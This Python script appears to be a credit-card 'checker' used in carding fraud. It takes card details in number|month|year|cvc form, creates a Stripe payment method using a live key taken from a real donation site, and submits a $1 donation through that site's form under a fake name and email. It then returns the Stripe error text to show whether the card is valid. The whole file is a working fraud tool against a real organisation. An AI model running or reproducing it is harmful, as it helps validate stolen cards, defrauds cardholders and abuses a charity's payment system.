import requests,re
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&referrer=https%3A%2F%2Fwww.ies.org&key=pk_live_51P9TaAICMxuGGufT8bmFY2rhq9xRyVXjNbKKfWPDnxokLQfxvLtuodinmJWEvfSwDYd3eTVb3hM79F0A5nytwp8l00vaSpJTcY'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'www.ies.org',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.ies.org',
	    'referer': 'https://www.ies.org/membership/donate/general/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1751820013450',
	}
	
	data = {
	    'data': f'item_24__fluent_sf=&__fluent_form_embded_post_id=157046&_fluentform_24_fluentformnonce=4f689476d3&_wp_http_referer=%2Fmembership%2Fdonate%2Fgeneral%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&in_honor_of=no&donation_amount=Custom%20Amount&custom_donation_amount=1&payment_method=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '24',
	}
	
	response = requests.post('https://www.ies.org/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
	
	try:
		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
